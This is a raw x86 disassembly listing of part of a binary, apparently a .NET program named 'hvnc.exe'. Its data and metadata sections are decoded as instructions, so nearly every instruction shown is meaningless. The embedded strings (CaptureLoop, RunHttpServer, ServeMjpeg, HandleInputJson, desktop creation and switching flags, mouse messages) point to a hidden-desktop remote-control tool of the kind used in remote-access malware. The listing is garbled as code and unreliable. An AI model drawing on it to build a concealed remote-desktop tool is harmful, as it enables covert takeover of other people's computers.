  404839:	00 08                	add    %cl,(%eax)
  40483b:	00 74 00 9b          	add    %dh,-0x65(%eax,%eax,1)
  40483f:	00 08                	add    %cl,(%eax)
  404841:	00 78 00             	add    %bh,0x0(%eax)
  404844:	a0 00 08 00 7c       	mov    0x7c000800,%al
  404849:	00 a5 00 08 00 80    	add    %ah,-0x7ffff800(%ebp)
  40484f:	00 aa 00 08 00 84    	add    %ch,-0x7bfff800(%edx)
  404855:	00 af 00 08 00 88    	add    %ch,-0x77fff800(%edi)
  40485b:	00 b4 00 08 00 8c 00 	add    %dh,0x8c0008(%eax,%eax,1)
  404862:	b9 00 08 00 90       	mov    $0x90000800,%ecx
  404867:	00 be 00 08 00 94    	add    %bh,-0x6bfff800(%esi)
  40486d:	00 a0 00 08 00 98    	add    %ah,-0x67fff800(%eax)
  404873:	00 c3                	add    %al,%bl
  404875:	00 08                	add    %cl,(%eax)
  404877:	00 9c 00 c8 00 08 00 	add    %bl,0x800c8(%eax,%eax,1)
  40487e:	a0 00 78 00 08       	mov    0x8007800,%al
  404883:	00 a4 00 7d 00 08 00 	add    %ah,0x8007d(%eax,%eax,1)
  40488a:	a8 00                	test   $0x0,%al
  40488c:	7d 00                	jge    0x40488e
  40488e:	2e 00 23             	add    %ah,%cs:(%ebx)
  404891:	00 34 04             	add    %dh,(%esp,%eax,1)
  404894:	2e 00 1b             	add    %bl,%cs:(%ebx)
  404897:	00 2b                	add    %ch,(%ebx)
  404899:	04 e3                	add    $0xe3,%al
  40489b:	00 2b                	add    %ch,(%ebx)
  40489d:	00 78 00             	add    %bh,0x0(%eax)
  4048a0:	03 01                	add    (%ecx),%eax
  4048a2:	2b 00                	sub    (%eax),%eax
  4048a4:	78 00                	js     0x4048a6
  4048a6:	23 01                	and    (%ecx),%eax
  4048a8:	2b 00                	sub    (%eax),%eax
  4048aa:	78 00                	js     0x4048ac
  4048ac:	43                   	inc    %ebx
  4048ad:	01 2b                	add    %ebp,(%ebx)
  4048af:	00 78 00             	add    %bh,0x0(%eax)
  4048b2:	00 02                	add    %al,(%edx)
  4048b4:	2b 00                	sub    (%eax),%eax
  4048b6:	78 00                	js     0x4048b8
  4048b8:	21 02                	and    %eax,(%edx)
  4048ba:	2b 00                	sub    (%eax),%eax
  4048bc:	78 00                	js     0x4048be
  4048be:	2d 00 23 01 31       	sub    $0x31012300,%eax
  4048c3:	00 23                	add    %ah,(%ebx)
  4048c5:	01 35 00 23 01 3d    	add    %esi,0x3d012300
  4048cb:	00 23                	add    %ah,(%ebx)
  4048cd:	01 41 00             	add    %eax,0x0(%ecx)
  4048d0:	23 01                	and    (%ecx),%eax
  4048d2:	45                   	inc    %ebp
  4048d3:	00 23                	add    %ah,(%ebx)
  4048d5:	01 51 00             	add    %edx,0x0(%ecx)
  4048d8:	23 01                	and    (%ecx),%eax
  4048da:	59                   	pop    %ecx
  4048db:	00 23                	add    %ah,(%ebx)
  4048dd:	01 57 01             	add    %edx,0x1(%edi)
  4048e0:	6b 01 cd             	imul   $0xffffffcd,(%ecx),%eax
  4048e3:	01 08                	add    %ecx,(%eax)
  4048e5:	02 31                	add    (%ecx),%dh
  4048e7:	02 66 02             	add    0x2(%esi),%ah
  4048ea:	b0 02                	mov    $0x2,%al
  4048ec:	d6                   	salc
  4048ed:	02 15 03 2e 03 60    	add    0x60032e03,%dl
  4048f3:	03 77 03             	add    0x3(%edi),%esi
  4048f6:	a0 03 bb 03 ea       	mov    0xea03bb03,%al
  4048fb:	03 0e                	add    (%esi),%ecx
  4048fd:	04 18                	add    $0x18,%al
  4048ff:	04 9d                	add    $0x9d,%al
  404901:	0d fa 01 20 02       	or     $0x22001fa,%eax
  404906:	f7 02 44 01 27 00    	testl  $0x270144,(%edx)
  40490c:	a8 0d                	test   $0xd,%al
  40490e:	01 00                	add    %eax,(%eax)
  404910:	40                   	inc    %eax
  404911:	01 29                	add    %ebp,(%ecx)
  404913:	00 e3                	add    %ah,%bl
  404915:	03 01                	add    (%ecx),%eax
  404917:	00 40 01             	add    %al,0x1(%eax)
  40491a:	2b 00                	sub    (%eax),%eax
  40491c:	f0 03 01             	lock add (%ecx),%eax
  40491f:	00 40 01             	add    %al,0x1(%eax)
  404922:	2d 00 01 04 01       	sub    $0x1040100,%eax
  404927:	00 40 01             	add    %al,0x1(%eax)
  40492a:	2f                   	das
  40492b:	00 14 04             	add    %dl,(%esp,%eax,1)
  40492e:	01 00                	add    %eax,(%eax)
  404930:	40                   	inc    %eax
  404931:	01 31                	add    %esi,(%ecx)
  404933:	00 24 04             	add    %ah,(%esp,%eax,1)
  404936:	01 00                	add    %eax,(%eax)
  404938:	40                   	inc    %eax
  404939:	01 33                	add    %esi,(%ebx)
  40493b:	00 2d 04 01 00 44    	add    %ch,0x44000104
  404941:	01 35 00 55 04 01    	add    %esi,0x1045500
  404947:	00 40 01             	add    %al,0x1(%eax)
  40494a:	37                   	aaa
  40494b:	00 63 04             	add    %ah,0x4(%ebx)
  40494e:	01 00                	add    %eax,(%eax)
  404950:	40                   	inc    %eax
  404951:	01 39                	add    %edi,(%ecx)
  404953:	00 6f 04             	add    %ch,0x4(%edi)
  404956:	01 00                	add    %eax,(%eax)
  404958:	04 80                	add    $0x80,%al
	...
  40496a:	1e                   	push   %ds
  40496b:	06                   	push   %es
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 00                	add    $0x0,%al
	...
  404978:	00 00                	add    %al,(%eax)
  40497a:	01 00                	add    %eax,(%eax)
  40497c:	49                   	dec    %ecx
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 00                	add    %al,(%eax)
  404981:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40498c:	00 00                	add    %al,(%eax)
  40498e:	29 00                	sub    %eax,(%eax)
  404990:	3e 01 00             	add    %eax,%ds:(%eax)
  404993:	00 00                	add    %al,(%eax)
  404995:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	01 00                	add    %eax,(%eax)
  4049a4:	52                   	push   %edx
  4049a5:	00 00                	add    %al,(%eax)
  4049a7:	00 00                	add    %al,(%eax)
  4049a9:	00 03                	add    %al,(%ebx)
  4049ab:	00 02                	add    %al,(%edx)
  4049ad:	00 04 00             	add    %al,(%eax,%eax,1)
  4049b0:	02 00                	add    (%eax),%al
  4049b2:	05 00 04 00 06       	add    $0x6000400,%eax
  4049b7:	00 04 00             	add    %al,(%eax,%eax,1)
  4049ba:	07                   	pop    %es
  4049bb:	00 02                	add    %al,(%edx)
  4049bd:	00 08                	add    %cl,(%eax)
  4049bf:	00 02                	add    %al,(%edx)
  4049c1:	00 0a                	add    %cl,(%edx)
  4049c3:	00 02                	add    %al,(%edx)
  4049c5:	00 00                	add    %al,(%eax)
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	3c 4d                	cmp    $0x4d,%al
  4049cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4049cc:	64 75 6c             	fs jne 0x404a3b
  4049cf:	65 3e 00 68 76       	gs add %ch,%ds:0x76(%eax)
  4049d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4049d5:	63 2e                	arpl   %ebp,(%esi)
  4049d7:	65 78 65             	gs js  0x404a3f
  4049da:	00 50 72             	add    %dl,0x72(%eax)
  4049dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4049de:	67 72 61             	addr16 jb 0x404a42
  4049e1:	6d                   	insl   (%dx),%es:(%edi)
  4049e2:	00 57 69             	add    %dl,0x69(%edi)
  4049e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4049e6:	64 6f                	outsl  %fs:(%esi),(%dx)
  4049e8:	77 49                	ja     0x404a33
  4049ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4049eb:	66 6f                	outsw  %ds:(%esi),(%dx)
  4049ed:	00 4e 61             	add    %cl,0x61(%esi)
  4049f0:	74 69                	je     0x404a5b
  4049f2:	76 65                	jbe    0x404a59
  4049f4:	00 52 45             	add    %dl,0x45(%edx)
  4049f7:	43                   	inc    %ebx
  4049f8:	54                   	push   %esp
  4049f9:	00 45 6e             	add    %al,0x6e(%ebp)
  4049fc:	75 6d                	jne    0x404a6b
  4049fe:	44                   	inc    %esp
  4049ff:	65 73 6b             	gs jae 0x404a6d
  404a02:	74 6f                	je     0x404a73
  404a04:	70 57                	jo     0x404a5d
  404a06:	69 6e 64 6f 77 73 50 	imul   $0x5073776f,0x64(%esi),%ebp
  404a0d:	72 6f                	jb     0x404a7e
  404a0f:	63 00                	arpl   %eax,(%eax)
  404a11:	6d                   	insl   (%dx),%es:(%edi)
  404a12:	73 63                	jae    0x404a77
  404a14:	6f                   	outsl  %ds:(%esi),(%dx)
  404a15:	72 6c                	jb     0x404a83
  404a17:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  404a1e:	65 6d                	gs insl (%dx),%es:(%edi)
  404a20:	00 4f 62             	add    %cl,0x62(%edi)
  404a23:	6a 65                	push   $0x65
  404a25:	63 74 00 56          	arpl   %esi,0x56(%eax,%eax,1)
  404a29:	61                   	popa
  404a2a:	6c                   	insb   (%dx),%es:(%edi)
  404a2b:	75 65                	jne    0x404a92
  404a2d:	54                   	push   %esp
  404a2e:	79 70                	jns    0x404aa0
  404a30:	65 00 4d 75          	add    %cl,%gs:0x75(%ebp)
  404a34:	6c                   	insb   (%dx),%es:(%edi)
  404a35:	74 69                	je     0x404aa0
  404a37:	63 61 73             	arpl   %esp,0x73(%ecx)
  404a3a:	74 44                	je     0x404a80
  404a3c:	65 6c                	gs insb (%dx),%es:(%edi)
  404a3e:	65 67 61             	gs addr16 popa
  404a41:	74 65                	je     0x404aa8
  404a43:	00 53 79             	add    %dl,0x79(%ebx)
  404a46:	73 74                	jae    0x404abc
  404a48:	65 6d                	gs insl (%dx),%es:(%edi)
  404a4a:	2e 52                	cs push %edx
  404a4c:	75 6e                	jne    0x404abc
  404a4e:	74 69                	je     0x404ab9
  404a50:	6d                   	insl   (%dx),%es:(%edi)
  404a51:	65 2e 43             	gs cs inc %ebx
  404a54:	6f                   	outsl  %ds:(%esi),(%dx)
  404a55:	6d                   	insl   (%dx),%es:(%edi)
  404a56:	70 69                	jo     0x404ac1
  404a58:	6c                   	insb   (%dx),%es:(%edi)
  404a59:	65 72 53             	gs jb  0x404aaf
  404a5c:	65 72 76             	gs jb  0x404ad5
  404a5f:	69 63 65 73 00 49 73 	imul   $0x73490073,0x65(%ebx),%esp
  404a66:	56                   	push   %esi
  404a67:	6f                   	outsl  %ds:(%esi),(%dx)
  404a68:	6c                   	insb   (%dx),%es:(%edi)
  404a69:	61                   	popa
  404a6a:	74 69                	je     0x404ad5
  404a6c:	6c                   	insb   (%dx),%es:(%edi)
  404a6d:	65 00 5f 72          	add    %bl,%gs:0x72(%edi)
  404a71:	75 6e                	jne    0x404ae1
  404a73:	6e                   	outsb  %ds:(%esi),(%dx)
  404a74:	69 6e 67 00 5f 73 74 	imul   $0x74735f00,0x67(%esi),%ebp
  404a7b:	61                   	popa
  404a7c:	74 65                	je     0x404ae3
  404a7e:	4c                   	dec    %esp
  404a7f:	6f                   	outsl  %ds:(%esi),(%dx)
  404a80:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  404a83:	5f                   	pop    %edi
  404a84:	64 65 73 6b          	fs gs jae 0x404af3
  404a88:	74 6f                	je     0x404af9
  404a8a:	70 4e                	jo     0x404ada
  404a8c:	61                   	popa
  404a8d:	6d                   	insl   (%dx),%es:(%edi)
  404a8e:	65 00 5f 70          	add    %bl,%gs:0x70(%edi)
  404a92:	6f                   	outsl  %ds:(%esi),(%dx)
  404a93:	72 74                	jb     0x404b09
  404a95:	00 5f 66             	add    %bl,0x66(%edi)
  404a98:	70 73                	jo     0x404b0d
  404a9a:	00 5f 6a             	add    %bl,0x6a(%edi)
  404a9d:	70 65                	jo     0x404b04
  404a9f:	67 51                	addr16 push %ecx
  404aa1:	75 61                	jne    0x404b04
  404aa3:	6c                   	insb   (%dx),%es:(%edi)
  404aa4:	69 74 79 00 5f 64 65 	imul   $0x7365645f,0x0(%ecx,%edi,2),%esi
  404aab:	73 
  404aac:	6b 74 6f 70 00       	imul   $0x0,0x70(%edi,%ebp,2),%esi
  404ab1:	5f                   	pop    %edi
  404ab2:	74 61                	je     0x404b15
  404ab4:	72 67                	jb     0x404b1d
  404ab6:	65 74 48             	gs je  0x404b01
  404ab9:	77 6e                	ja     0x404b29
  404abb:	64 00 5f 74          	add    %bl,%fs:0x74(%edi)
  404abf:	61                   	popa
  404ac0:	72 67                	jb     0x404b29
  404ac2:	65 74 52             	gs je  0x404b17
  404ac5:	65 63 74 00 5f       	arpl   %esi,%gs:0x5f(%eax,%eax,1)
  404aca:	74 61                	je     0x404b2d
  404acc:	72 67                	jb     0x404b35
  404ace:	65 74 54             	gs je  0x404b25
  404ad1:	69 74 6c 65 00 5f 6c 	imul   $0x616c5f00,0x65(%esp,%ebp,2),%esi
  404ad8:	61 
  404ad9:	74 65                	je     0x404b40
  404adb:	73 74                	jae    0x404b51
  404add:	4a                   	dec    %edx
  404ade:	70 65                	jo     0x404b45
  404ae0:	67 00 5f 66          	add    %bl,0x66(%bx)
  404ae4:	72 61                	jb     0x404b47
  404ae6:	6d                   	insl   (%dx),%es:(%edi)
  404ae7:	65 57                	gs push %edi
  404ae9:	69 64 74 68 00 5f 66 	imul   $0x72665f00,0x68(%esp,%esi,2),%esp
  404af0:	72 
  404af1:	61                   	popa
  404af2:	6d                   	insl   (%dx),%es:(%edi)
  404af3:	65 48                	gs dec %eax
  404af5:	65 69 67 68 74 00 5f 	imul   $0x615f0074,%gs:0x68(%edi),%esp
  404afc:	61 
  404afd:	63 74 75 61          	arpl   %esi,0x61(%ebp,%esi,2)
  404b01:	6c                   	insb   (%dx),%es:(%edi)
  404b02:	46                   	inc    %esi
  404b03:	70 73                	jo     0x404b78
  404b05:	00 53 79             	add    %dl,0x79(%ebx)
  404b08:	73 74                	jae    0x404b7e
  404b0a:	65 6d                	gs insl (%dx),%es:(%edi)
  404b0c:	2e 44                	cs inc %esp
  404b0e:	72 61                	jb     0x404b71
  404b10:	77 69                	ja     0x404b7b
  404b12:	6e                   	outsb  %ds:(%esi),(%dx)
  404b13:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  404b17:	73 74                	jae    0x404b8d
  404b19:	65 6d                	gs insl (%dx),%es:(%edi)
  404b1b:	2e 44                	cs inc %esp
  404b1d:	72 61                	jb     0x404b80
  404b1f:	77 69                	ja     0x404b8a
  404b21:	6e                   	outsb  %ds:(%esi),(%dx)
  404b22:	67 2e 49             	addr16 cs dec %ecx
  404b25:	6d                   	insl   (%dx),%es:(%edi)
  404b26:	61                   	popa
  404b27:	67 69 6e 67 00 49 6d 	imul   $0x616d4900,0x67(%bp),%ebp
  404b2e:	61 
  404b2f:	67 65 43             	addr16 gs inc %ebx
  404b32:	6f                   	outsl  %ds:(%esi),(%dx)
  404b33:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  404b38:	66 6f                	outsw  %ds:(%esi),(%dx)
  404b3a:	00 5f 6a             	add    %bl,0x6a(%edi)
  404b3d:	70 65                	jo     0x404ba4
  404b3f:	67 43                	addr16 inc %ebx
  404b41:	6f                   	outsl  %ds:(%esi),(%dx)
  404b42:	64 65 63 00          	fs arpl %eax,%gs:(%eax)
  404b46:	56                   	push   %esi
  404b47:	69 65 77 65 72 48 74 	imul   $0x74487265,0x77(%ebp),%esp
  404b4e:	6d                   	insl   (%dx),%es:(%edi)
  404b4f:	6c                   	insb   (%dx),%es:(%edi)
  404b50:	00 4d 61             	add    %cl,0x61(%ebp)
  404b53:	69 6e 00 50 61 72 73 	imul   $0x73726150,0x0(%esi),%ebp
  404b5a:	65 41                	gs inc %ecx
  404b5c:	72 67                	jb     0x404bc5
  404b5e:	73 00                	jae    0x404b60
  404b60:	43                   	inc    %ebx
  404b61:	61                   	popa
  404b62:	70 74                	jo     0x404bd8
  404b64:	75 72                	jne    0x404bd8
  404b66:	65 4c                	gs dec %esp
  404b68:	6f                   	outsl  %ds:(%esi),(%dx)
  404b69:	6f                   	outsl  %ds:(%esi),(%dx)
  404b6a:	70 00                	jo     0x404b6c
  404b6c:	50                   	push   %eax
  404b6d:	69 63 6b 54 61 72 67 	imul   $0x67726154,0x6b(%ebx),%esp
  404b74:	65 74 57             	gs je  0x404bce
  404b77:	69 6e 64 6f 77 00 52 	imul   $0x5200776f,0x64(%esi),%ebp
  404b7e:	75 6e                	jne    0x404bee
  404b80:	48                   	dec    %eax
  404b81:	74 74                	je     0x404bf7
  404b83:	70 53                	jo     0x404bd8
  404b85:	65 72 76             	gs jb  0x404bfe
  404b88:	65 72 00             	gs jb  0x404b8b
  404b8b:	53                   	push   %ebx
  404b8c:	79 73                	jns    0x404c01
  404b8e:	74 65                	je     0x404bf5
  404b90:	6d                   	insl   (%dx),%es:(%edi)
  404b91:	2e 4e                	cs dec %esi
  404b93:	65 74 00             	gs je  0x404b96
  404b96:	48                   	dec    %eax
  404b97:	74 74                	je     0x404c0d
  404b99:	70 4c                	jo     0x404be7
  404b9b:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  404ba2:	43                   	inc    %ebx
  404ba3:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba4:	6e                   	outsb  %ds:(%esi),(%dx)
  404ba5:	74 65                	je     0x404c0c
  404ba7:	78 74                	js     0x404c1d
  404ba9:	00 48 61             	add    %cl,0x61(%eax)
  404bac:	6e                   	outsb  %ds:(%esi),(%dx)
  404bad:	64 6c                	fs insb (%dx),%es:(%edi)
  404baf:	65 52                	gs push %edx
  404bb1:	65 71 75             	gs jno 0x404c29
  404bb4:	65 73 74             	gs jae 0x404c2b
  404bb7:	00 53 65             	add    %dl,0x65(%ebx)
  404bba:	72 76                	jb     0x404c32
  404bbc:	65 4d                	gs dec %ebp
  404bbe:	6a 70                	push   $0x70
  404bc0:	65 67 00 48 61       	add    %cl,%gs:0x61(%bx,%si)
  404bc5:	6e                   	outsb  %ds:(%esi),(%dx)
  404bc6:	64 6c                	fs insb (%dx),%es:(%edi)
  404bc8:	65 49                	gs dec %ecx
  404bca:	6e                   	outsb  %ds:(%esi),(%dx)
  404bcb:	70 75                	jo     0x404c42
  404bcd:	74 4a                	je     0x404c19
  404bcf:	73 6f                	jae    0x404c40
  404bd1:	6e                   	outsb  %ds:(%esi),(%dx)
  404bd2:	00 42 75             	add    %al,0x75(%edx)
  404bd5:	69 6c 64 57 69 6e 64 	imul   $0x6f646e69,0x57(%esp,%eiz,2),%ebp
  404bdc:	6f 
  404bdd:	77 73                	ja     0x404c52
  404bdf:	4a                   	dec    %edx
  404be0:	73 6f                	jae    0x404c51
  404be2:	6e                   	outsb  %ds:(%esi),(%dx)
  404be3:	00 50 61             	add    %dl,0x61(%eax)
  404be6:	63 6b 58             	arpl   %ebp,0x58(%ebx)
  404be9:	59                   	pop    %ecx
  404bea:	00 42 69             	add    %al,0x69(%edx)
  404bed:	74 6d                	je     0x404c5c
  404bef:	61                   	popa
  404bf0:	70 00                	jo     0x404bf2
  404bf2:	45                   	inc    %ebp
  404bf3:	6e                   	outsb  %ds:(%esi),(%dx)
  404bf4:	63 6f 64             	arpl   %ebp,0x64(%edi)
  404bf7:	65 4a                	gs dec %edx
  404bf9:	70 65                	jo     0x404c60
  404bfb:	67 00 46 69          	add    %al,0x69(%bp)
  404bff:	6e                   	outsb  %ds:(%esi),(%dx)
  404c00:	64 4a                	fs dec %edx
  404c02:	70 65                	jo     0x404c69
  404c04:	67 43                	addr16 inc %ebx
  404c06:	6f                   	outsl  %ds:(%esi),(%dx)
  404c07:	64 65 63 00          	fs arpl %eax,%gs:(%eax)
  404c0b:	4a                   	dec    %edx
  404c0c:	73 6f                	jae    0x404c7d
  404c0e:	6e                   	outsb  %ds:(%esi),(%dx)
  404c0f:	47                   	inc    %edi
  404c10:	65 74 53             	gs je  0x404c66
  404c13:	74 72                	je     0x404c87
  404c15:	69 6e 67 00 4a 73 6f 	imul   $0x6f734a00,0x67(%esi),%ebp
  404c1c:	6e                   	outsb  %ds:(%esi),(%dx)
  404c1d:	47                   	inc    %edi
  404c1e:	65 74 49             	gs je  0x404c6a
  404c21:	6e                   	outsb  %ds:(%esi),(%dx)
  404c22:	74 00                	je     0x404c24
  404c24:	45                   	inc    %ebp
  404c25:	73 63                	jae    0x404c8a
  404c27:	61                   	popa
  404c28:	70 65                	jo     0x404c8f
  404c2a:	4a                   	dec    %edx
  404c2b:	73 6f                	jae    0x404c9c
  404c2d:	6e                   	outsb  %ds:(%esi),(%dx)
  404c2e:	00 48 77             	add    %cl,0x77(%eax)
  404c31:	6e                   	outsb  %ds:(%esi),(%dx)
  404c32:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  404c36:	63 74 00 54          	arpl   %esi,0x54(%eax,%eax,1)
  404c3a:	69 74 6c 65 00 41 72 	imul   $0x65724100,0x65(%esp,%ebp,2),%esi
  404c41:	65 
  404c42:	61                   	popa
  404c43:	00 2e                	add    %ch,(%esi)
  404c45:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  404c49:	00 44 45 53          	add    %al,0x53(%ebp,%eax,2)
  404c4d:	4b                   	dec    %ebx
  404c4e:	54                   	push   %esp
  404c4f:	4f                   	dec    %edi
  404c50:	50                   	push   %eax
  404c51:	5f                   	pop    %edi
  404c52:	52                   	push   %edx
  404c53:	45                   	inc    %ebp
  404c54:	41                   	inc    %ecx
  404c55:	44                   	inc    %esp
  404c56:	4f                   	dec    %edi
  404c57:	42                   	inc    %edx
  404c58:	4a                   	dec    %edx
  404c59:	45                   	inc    %ebp
  404c5a:	43                   	inc    %ebx
  404c5b:	54                   	push   %esp
  404c5c:	53                   	push   %ebx
  404c5d:	00 44 45 53          	add    %al,0x53(%ebp,%eax,2)
  404c61:	4b                   	dec    %ebx
  404c62:	54                   	push   %esp
  404c63:	4f                   	dec    %edi
  404c64:	50                   	push   %eax
  404c65:	5f                   	pop    %edi
  404c66:	43                   	inc    %ebx
  404c67:	52                   	push   %edx
  404c68:	45                   	inc    %ebp
  404c69:	41                   	inc    %ecx
  404c6a:	54                   	push   %esp
  404c6b:	45                   	inc    %ebp
  404c6c:	57                   	push   %edi
  404c6d:	49                   	dec    %ecx
  404c6e:	4e                   	dec    %esi
  404c6f:	44                   	inc    %esp
  404c70:	4f                   	dec    %edi
  404c71:	57                   	push   %edi
  404c72:	00 44 45 53          	add    %al,0x53(%ebp,%eax,2)
  404c76:	4b                   	dec    %ebx
  404c77:	54                   	push   %esp
  404c78:	4f                   	dec    %edi
  404c79:	50                   	push   %eax
  404c7a:	5f                   	pop    %edi
  404c7b:	43                   	inc    %ebx
  404c7c:	52                   	push   %edx
  404c7d:	45                   	inc    %ebp
  404c7e:	41                   	inc    %ecx
  404c7f:	54                   	push   %esp
  404c80:	45                   	inc    %ebp
  404c81:	4d                   	dec    %ebp
  404c82:	45                   	inc    %ebp
  404c83:	4e                   	dec    %esi
  404c84:	55                   	push   %ebp
  404c85:	00 44 45 53          	add    %al,0x53(%ebp,%eax,2)
  404c89:	4b                   	dec    %ebx
  404c8a:	54                   	push   %esp
  404c8b:	4f                   	dec    %edi
  404c8c:	50                   	push   %eax
  404c8d:	5f                   	pop    %edi
  404c8e:	48                   	dec    %eax
  404c8f:	4f                   	dec    %edi
  404c90:	4f                   	dec    %edi
  404c91:	4b                   	dec    %ebx
  404c92:	43                   	inc    %ebx
  404c93:	4f                   	dec    %edi
  404c94:	4e                   	dec    %esi
  404c95:	54                   	push   %esp
  404c96:	52                   	push   %edx
  404c97:	4f                   	dec    %edi
  404c98:	4c                   	dec    %esp
  404c99:	00 44 45 53          	add    %al,0x53(%ebp,%eax,2)
  404c9d:	4b                   	dec    %ebx
  404c9e:	54                   	push   %esp
  404c9f:	4f                   	dec    %edi
  404ca0:	50                   	push   %eax
  404ca1:	5f                   	pop    %edi
  404ca2:	4a                   	dec    %edx
  404ca3:	4f                   	dec    %edi
  404ca4:	55                   	push   %ebp
  404ca5:	52                   	push   %edx
  404ca6:	4e                   	dec    %esi
  404ca7:	41                   	inc    %ecx
  404ca8:	4c                   	dec    %esp
  404ca9:	52                   	push   %edx
  404caa:	45                   	inc    %ebp
  404cab:	43                   	inc    %ebx
  404cac:	4f                   	dec    %edi
  404cad:	52                   	push   %edx
  404cae:	44                   	inc    %esp
  404caf:	00 44 45 53          	add    %al,0x53(%ebp,%eax,2)
  404cb3:	4b                   	dec    %ebx
  404cb4:	54                   	push   %esp
  404cb5:	4f                   	dec    %edi
  404cb6:	50                   	push   %eax
  404cb7:	5f                   	pop    %edi
  404cb8:	4a                   	dec    %edx
  404cb9:	4f                   	dec    %edi
  404cba:	55                   	push   %ebp
  404cbb:	52                   	push   %edx
  404cbc:	4e                   	dec    %esi
  404cbd:	41                   	inc    %ecx
  404cbe:	4c                   	dec    %esp
  404cbf:	50                   	push   %eax
  404cc0:	4c                   	dec    %esp
  404cc1:	41                   	inc    %ecx
  404cc2:	59                   	pop    %ecx
  404cc3:	42                   	inc    %edx
  404cc4:	41                   	inc    %ecx
  404cc5:	43                   	inc    %ebx
  404cc6:	4b                   	dec    %ebx
  404cc7:	00 44 45 53          	add    %al,0x53(%ebp,%eax,2)
  404ccb:	4b                   	dec    %ebx
  404ccc:	54                   	push   %esp
  404ccd:	4f                   	dec    %edi
  404cce:	50                   	push   %eax
  404ccf:	5f                   	pop    %edi
  404cd0:	45                   	inc    %ebp
  404cd1:	4e                   	dec    %esi
  404cd2:	55                   	push   %ebp
  404cd3:	4d                   	dec    %ebp
  404cd4:	45                   	inc    %ebp
  404cd5:	52                   	push   %edx
  404cd6:	41                   	inc    %ecx
  404cd7:	54                   	push   %esp
  404cd8:	45                   	inc    %ebp
  404cd9:	00 44 45 53          	add    %al,0x53(%ebp,%eax,2)
  404cdd:	4b                   	dec    %ebx
  404cde:	54                   	push   %esp
  404cdf:	4f                   	dec    %edi
  404ce0:	50                   	push   %eax
  404ce1:	5f                   	pop    %edi
  404ce2:	57                   	push   %edi
  404ce3:	52                   	push   %edx
  404ce4:	49                   	dec    %ecx
  404ce5:	54                   	push   %esp
  404ce6:	45                   	inc    %ebp
  404ce7:	4f                   	dec    %edi
  404ce8:	42                   	inc    %edx
  404ce9:	4a                   	dec    %edx
  404cea:	45                   	inc    %ebp
  404ceb:	43                   	inc    %ebx
  404cec:	54                   	push   %esp
  404ced:	53                   	push   %ebx
  404cee:	00 44 45 53          	add    %al,0x53(%ebp,%eax,2)
  404cf2:	4b                   	dec    %ebx
  404cf3:	54                   	push   %esp
  404cf4:	4f                   	dec    %edi
  404cf5:	50                   	push   %eax
  404cf6:	5f                   	pop    %edi
  404cf7:	53                   	push   %ebx
  404cf8:	57                   	push   %edi
  404cf9:	49                   	dec    %ecx
  404cfa:	54                   	push   %esp
  404cfb:	43                   	inc    %ebx
  404cfc:	48                   	dec    %eax
  404cfd:	44                   	inc    %esp
  404cfe:	45                   	inc    %ebp
  404cff:	53                   	push   %ebx
  404d00:	4b                   	dec    %ebx
  404d01:	54                   	push   %esp
  404d02:	4f                   	dec    %edi
  404d03:	50                   	push   %eax
  404d04:	00 57 4d             	add    %dl,0x4d(%edi)
  404d07:	5f                   	pop    %edi
  404d08:	4d                   	dec    %ebp
  404d09:	4f                   	dec    %edi
  404d0a:	55                   	push   %ebp
  404d0b:	53                   	push   %ebx
  404d0c:	45                   	inc    %ebp
  404d0d:	4d                   	dec    %ebp
  404d0e:	4f                   	dec    %edi
  404d0f:	56                   	push   %esi
  404d10:	45                   	inc    %ebp
  404d11:	00 57 4d             	add    %dl,0x4d(%edi)
  404d14:	5f                   	pop    %edi
  404d15:	4c                   	dec    %esp
  404d16:	42                   	inc    %edx
  404d17:	55                   	push   %ebp
  404d18:	54                   	push   %esp
  404d19:	54                   	push   %esp
  404d1a:	4f                   	dec    %edi
  404d1b:	4e                   	dec    %esi
  404d1c:	44                   	inc    %esp
  404d1d:	4f                   	dec    %edi
  404d1e:	57                   	push   %edi
  404d1f:	4e                   	dec    %esi
  404d20:	00 57 4d             	add    %dl,0x4d(%edi)
  404d23:	5f                   	pop    %edi
  404d24:	4c                   	dec    %esp
  404d25:	42                   	inc    %edx
  404d26:	55                   	push   %ebp
  404d27:	54                   	push   %esp
  404d28:	54                   	push   %esp
  404d29:	4f                   	dec    %edi
  404d2a:	4e                   	dec    %esi
  404d2b:	55                   	push   %ebp
  404d2c:	50                   	push   %eax
  404d2d:	00 57 4d             	add    %dl,0x4d(%edi)
  404d30:	5f                   	pop    %edi
  404d31:	52                   	push   %edx
  404d32:	42                   	inc    %edx
  404d33:	55                   	push   %ebp
  404d34:	54                   	push   %esp
  404d35:	54                   	push   %esp
  404d36:	4f                   	dec    %edi
  404d37:	4e                   	dec    %esi
  404d38:	44                   	inc    %esp
  404d39:	4f                   	dec    %edi
  404d3a:	57                   	push   %edi
  404d3b:	4e                   	dec    %esi
  404d3c:	00 57 4d             	add    %dl,0x4d(%edi)
  404d3f:	5f                   	pop    %edi
  404d40:	52                   	push   %edx
  404d41:	42                   	inc    %edx
  404d42:	55                   	push   %ebp
  404d43:	54                   	push   %esp
  404d44:	54                   	push   %esp
  404d45:	4f                   	dec    %edi
  404d46:	4e                   	dec    %esi
  404d47:	55                   	push   %ebp
  404d48:	50                   	push   %eax
  404d49:	00 57 4d             	add    %dl,0x4d(%edi)
  404d4c:	5f                   	pop    %edi
  404d4d:	4d                   	dec    %ebp
  404d4e:	4f                   	dec    %edi
  404d4f:	55                   	push   %ebp
  404d50:	53                   	push   %ebx
  404d51:	45                   	inc    %ebp
  404d52:	57                   	push   %edi
